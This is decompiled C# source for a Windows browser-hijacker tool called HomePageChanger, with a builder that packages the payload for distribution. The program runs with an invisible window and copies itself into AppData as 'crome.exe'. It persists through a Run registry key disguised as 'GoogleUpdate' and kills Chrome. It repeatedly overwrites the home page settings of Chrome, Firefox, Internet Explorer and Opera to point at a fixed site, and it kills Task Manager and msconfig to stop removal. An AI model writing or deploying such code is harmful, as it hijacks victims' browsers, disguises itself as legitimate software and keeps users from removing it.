using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace HomePageChanger;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private Button button1;

	private TextBox maintable;

	private TextBox chromeset;

	private Label label2;

	private Label label3;

	private TextBox textBox2;

	private TextBox textBox3;

	private Timer timer1;

	private Timer timer2;

	private CheckBox checkBox1;

	private TextBox firefoxss;

	private TextBox fireset;

	private Timer timer3;

	private Timer timer4;

	private Timer timer5;

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool WritePrivateProfileString(string lpAppName, string lpKeyName, string lpString, string lpFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	private static extern uint GetPrivateProfileString(string lpAppName, string lpKeyName, string lpDefault, StringBuilder lpReturnedString, uint nSize, string lpFileName);

	public string encode(string str)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(str);
		string text = Convert.ToBase64String(bytes);
		return text.ToString();
	}

	public string decode(string str)
	{
		byte[] bytes = Convert.FromBase64String(str);
		string @string = Encoding.UTF8.GetString(bytes);
		return @string.ToString();
	}

	private void dosyayaz(string path, string deger, bool lineyazsin, bool ustuneyazsin)
	{
		if (lineyazsin)
		{
			StreamWriter streamWriter = new StreamWriter(path, ustuneyazsin);
			streamWriter.WriteLine(deger);
			streamWriter.Close();
		}
		else
		{
			StreamWriter streamWriter = new StreamWriter(path, ustuneyazsin);
			streamWriter.Write(deger);
			streamWriter.Close();
		}
	}

	public string dosyaoku(string path, bool line)
	{
		StreamReader streamReader;
		string text;
		if (line)
		{
			streamReader = new StreamReader(path);
			text = streamReader.ReadLine();
			streamReader.Close();
			return text.ToString();
		}
		streamReader = new StreamReader(path);
		text = streamReader.ReadToEnd();
		streamReader.Close();
		return text.ToString();
	}

	private void iniyaz(string path, string section, string key, string value)
	{
		WritePrivateProfileString(section, key, value, path);
	}

	public string inioku(string path, string section, string key, string defval)
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Capacity = 100000;
		GetPrivateProfileString(section, key, defval, stringBuilder, 100000u, path);
		return stringBuilder.ToString();
	}

	public string exeadi()
	{
		string text = Assembly.GetExecutingAssembly().Location.ToString();
		string oldValue = Application.get_StartupPath() + "\\";
		string text2 = text.Replace(oldValue, "");
		return text2.ToString();
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		string value = encode(((Control)textBox1).get_Text());
		iniyaz(Application.get_StartupPath() + "\\koda\\list.dll", "homepage", "anasayfa", value);
		iniyaz(Application.get_StartupPath() + "\\koda\\list.dll", "homepage", "hataonoff", checkBox1.get_Checked().ToString());
		iniyaz(Application.get_StartupPath() + "\\koda\\list.dll", "homepage", "hatamesaji", ((Control)textBox3).get_Text());
		iniyaz(Application.get_StartupPath() + "\\koda\\list.dll", "homepage", "hatabasligi", ((Control)textBox2).get_Text());
		File.SetAttributes(Application.get_StartupPath() + "\\koda", FileAttributes.Hidden | FileAttributes.System);
		File.SetAttributes(Application.get_StartupPath() + "\\koda\\list.dll", FileAttributes.Hidden | FileAttributes.System);
		MessageBox.Show("Program Hazirlandi ! koda Dosyasıyla Beraber Zipleyip Gönderiniz!");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName(exeadi().Replace(".exe", ""));
		Process.GetProcessesByName("crome");
		if (processesByName.Length == 1)
		{
			try
			{
				if (Application.get_ExecutablePath() != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\crome.exe")
				{
					File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\crome.exe", overwrite: true);
					Process process = new Process();
					Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "GoogleUpdate", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\crome.exe");
					process.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\crome.exe";
					process.StartInfo.UseShellExecute = false;
					process.Start();
					Application.Exit();
				}
				else
				{
					timer1.set_Enabled(true);
				}
				return;
			}
			catch
			{
				return;
			}
		}
		Application.Exit();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("chrome");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
		timer2.set_Enabled(true);
		timer3.set_Enabled(true);
		timer4.set_Enabled(true);
		timer5.set_Enabled(true);
		timer1.set_Enabled(false);
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			string newValue = "http://anaasayfa.com";
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Preferences";
			string text = ((Control)chromeset).get_Text().Replace("http://www.google.com.tr/", newValue);
			StreamWriter streamWriter = new StreamWriter(path);
			streamWriter.Write("");
			streamWriter.Write(((Control)maintable).get_Text() + text);
			streamWriter.Close();
		}
		catch (Exception)
		{
		}
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (checkBox1.get_Checked())
		{
			((Control)textBox2).set_Enabled(true);
			((Control)textBox3).set_Enabled(true);
			((Control)checkBox1).set_Text("Hata Mesajı : ON");
		}
		else
		{
			((Control)checkBox1).set_Text("Hata Mesajı : OFF");
			((Control)textBox2).set_Enabled(false);
			((Control)textBox3).set_Enabled(false);
		}
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string newValue = "http://anaasayfa.com";
			string text = inioku(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\profiles.ini", "Profile0", "Path", "");
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\" + text + "\\prefs.js";
			string value = ((Control)firefoxss).get_Text().Replace("http://www.google.com.tr", newValue);
			StreamWriter streamWriter = new StreamWriter(path);
			streamWriter.Write("");
			streamWriter.Write(value);
			streamWriter.Close();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void timer4_Tick(object sender, EventArgs e)
	{
		try
		{
			string value = "http://anaasayfa.com";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", writable: true);
			registryKey.SetValue("Start Page", value);
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}

	private void timer5_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			Process[] processesByName2 = Process.GetProcessesByName("msconfig");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
			array = processesByName2;
			foreach (Process process2 in array)
			{
				process2.Kill();
			}
			string value = "http://anaasayfa.com";
			iniyaz(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\Opera\\operaprefs.ini", "User Prefs", "Home URL", value);
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_0766: Unknown result type (might be due to invalid IL or missing references)
		//IL_0770: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		maintable = new TextBox();
		chromeset = new TextBox();
		label2 = new Label();
		label3 = new Label();
		textBox2 = new TextBox();
		textBox3 = new TextBox();
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		checkBox1 = new CheckBox();
		firefoxss = new TextBox();
		fireset = new TextBox();
		timer3 = new Timer(components);
		timer4 = new Timer(components);
		timer5 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(49, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Site Adı :");
		((Control)textBox1).set_Location(new Point(67, 6));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(168, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox1).set_Text("http://");
		((Control)button1).set_Location(new Point(77, 113));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(96, 23));
		((Control)button1).set_TabIndex(2);
		((Control)button1).set_Text("Oluştur");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)maintable).set_Location(new Point(12, 342));
		((TextBoxBase)maintable).set_Multiline(true);
		((Control)maintable).set_Name("maintable");
		((Control)maintable).set_Size(new Size(364, 34));
		((Control)maintable).set_TabIndex(3);
		((Control)maintable).set_Text(componentResourceManager.GetString("maintable.Text"));
		((Control)chromeset).set_Location(new Point(12, 382));
		((TextBoxBase)chromeset).set_Multiline(true);
		((Control)chromeset).set_Name("chromeset");
		((Control)chromeset).set_Size(new Size(364, 32));
		((Control)chromeset).set_TabIndex(4);
		((Control)chromeset).set_Text(componentResourceManager.GetString("chromeset.Text"));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(12, 37));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(69, 13));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("Hata Başlığı :");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(12, 64));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(69, 13));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("Hata Mesajı :");
		((Control)textBox2).set_Location(new Point(87, 34));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(148, 20));
		((Control)textBox2).set_TabIndex(7);
		((Control)textBox3).set_Location(new Point(87, 64));
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(148, 20));
		((Control)textBox3).set_TabIndex(8);
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.set_Interval(2000);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_Location(new Point(15, 90));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(111, 17));
		((Control)checkBox1).set_TabIndex(9);
		((Control)checkBox1).set_Text("Hata Mesajı : OFF");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		checkBox1.add_CheckedChanged((EventHandler)checkBox1_CheckedChanged);
		((Control)firefoxss).set_Location(new Point(397, 342));
		((TextBoxBase)firefoxss).set_Multiline(true);
		((Control)firefoxss).set_Name("firefoxss");
		((Control)firefoxss).set_Size(new Size(169, 72));
		((Control)firefoxss).set_TabIndex(10);
		((Control)firefoxss).set_Text(componentResourceManager.GetString("firefoxss.Text"));
		((Control)fireset).set_Location(new Point(397, 428));
		((TextBoxBase)fireset).set_Multiline(true);
		((Control)fireset).set_Name("fireset");
		((Control)fireset).set_Size(new Size(169, 20));
		((Control)fireset).set_TabIndex(11);
		((Control)fireset).set_Text("user_pref(\"browser.startup.homepage\", \"http://www.google.com.tr/\");");
		timer3.set_Interval(2000);
		timer3.add_Tick((EventHandler)timer3_Tick);
		timer4.set_Interval(2000);
		timer4.add_Tick((EventHandler)timer4_Tick);
		timer5.set_Interval(2000);
		timer5.add_Tick((EventHandler)timer5_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(4, 0));
		((Control)this).get_Controls().Add((Control)(object)fireset);
		((Control)this).get_Controls().Add((Control)(object)firefoxss);
		((Control)this).get_Controls().Add((Control)(object)checkBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)chromeset);
		((Control)this).get_Controls().Add((Control)(object)maintable);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("HomePageChanger - WwW.TakurTukur.NeT");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
